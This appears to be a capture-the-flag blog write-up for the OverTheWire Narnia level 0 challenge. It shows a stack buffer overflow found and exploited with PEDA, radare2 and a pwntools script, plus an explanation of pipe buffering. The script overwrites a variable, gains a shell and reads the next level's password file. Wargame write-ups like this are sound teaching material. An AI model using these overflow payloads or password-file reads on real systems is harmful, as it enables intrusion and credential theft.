---
title: "Narnia0 Write-up"
layout: post
category: HackING
author: A1phaZer0
---
3 ways to conquer narnia0, by peda, by radare2 and by pwntools.
<!--more-->
### PEDA way
1.Get De Bruijn sequence to make overflow happen.  
```bash
gdb-peda$ pattern create 50
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbA'
gdb-peda$ r
Starting program: /narnia/narnia0 
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbA
buf: AAA%AAsAABAA$AAnAACAA-AA
val: 0x41412d41
WAY OFF!!!!
[Inferior 1 (process 1013) exited with code 01]
Warning: not running or target is remote
```
2.`val` is filled by `0x41 0x2d 0x41 0x41` (little endian), which is `A-AA`. Now we know that `val` is 20 bytes away from beginning of the buffer.  
```bash
gdb-peda$ pattern offset A-AA
A-AA found at offset: 20
```
3.Craft the desired sequence.  
```bash
$ perl -e 'print "A"x20 . "\xef\xbe\xad\xde"' | ./narnia0
```
4.But, nothing happened.  
```bash
narnia0@narnia:/narnia$ perl -e 'print "A"x20 . "\xef\xbe\xad\xde"' | ./narnia0
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAﾭ�
                                                 val: 0xdeadbeef
narnia0@narnia:/narnia$
```
NOW, HERE IS THE TRICK   
```c
+-------------------+           +--------------+           +-------------------+
|                   |  write()  |              |  read()   |                   |
|  libc I/O buffer  |---------->| pipe buffer  |---------->|  libc I/O buffer  |
|                   |           |              |           |                   |
+-------------------+           +--------------+           +-------------------+
|             ^     |                                      |     |             |
| printf()    |     |                                      |     |    scanf()  |
| puts()      |     |                                      |     |    getline()|
| fwrite()----+     |                                      |     +---->fread() |
|                   |                                      |                   |
|                   |                                      |                   |
+-------------------+                                      +-------------------+
```
* stdin is always buffered.
* stderr is always unbuffered.
* stdout is line buffered if it's a terminal, otherwise it's buffered.
* if left side of pipe is closed, right side process will read() a EOF.

So, when a process on the left side of the pipe explicitly calls flush function or when it exits, everything in I/O buffer will be write() into pipe buffer. On the right side, it's a different story, e.g. `scanf("%20s", buf);`, if characters left in I/O buffer is not enough, then kernel will read() everything in pipe buffer into I/O buffer, if characters in pipe buffer is not adequate, then there will be another read() until there's nothing to read(), i.e. read() returns 0.  

In this program, narnia0, `system("/bin/sh");` is called, means that there will be another process and I/O buffer connected to pipe buffer. New shell tries to read() from pipe buffer to get input, so our work is to satisfy `scanf()` in narnia0 and leave something to read() in pipe buffer.  

### radare2 way
In radare2 one can directly do reverse engineering to see what's under the hood.   
1.Open binary and navigate to `main`.
```bash
narnia0@narnia:/narnia$ r2 narnia0
[0x08048400]> s main
```
2.Analyze `main` function and print disassembled code.
```c
[0x080484fd]> afr main
[0x080484fd]> pdf
/ (fcn) main 156
|           0x080484fd      55             push ebp
|           0x080484fe      89e5           mov ebp, esp
|           0x08048500      83e4f0         and esp, 0xfffffff0
|           0x08048503      83ec30         sub esp, 0x30
|           0x08048506      c744242c4141.  mov dword [esp + 0x2c], 0x41414141
|           ...
|           0x08048526      8d442418       lea eax, [esp + 0x18]
|           0x0804852a      89442404       mov dword [esp + 4], eax
|           0x0804852e      c70424798604.  mov dword [esp], str._24s
|           0x08048535      e8b6feffff     call sym.imp.__isoc99_scanf
|           ...
|           0x08048597      c9             leave
\           0x08048598      c3             ret
```
As one can see, `esp + 0x2c` is where 0x41414141 located and `esp + 0x18` is where buffer start.
```bash
[0x080484fd]> ? 0x2c - 0x18
20 0x14 024 20 0000:0014 20 "\x14" 00010100 20.0 20.000000f 20.000000
```
Now one can know that `val` is 20 bytes away from `buffer` and scanf reads 24 bytes from input, so the last 4 bytes will override what's in `val`.  

### pwntools way
```python
#!/usr/bin/env python

from pwn import *

session = ssh('narnia0', 'narnia.labs.overthewire.org', port=2226, password='narnia0')

io = session.process('/narnia/narnia0')

io.sendline(cyclic(20)+p32(0xdeadbeef))
io.sendline('cat /etc/narnia_pass/narnia1')

log.info (io.recvregex('\$.*\n'))

io.close()
session.close()
```
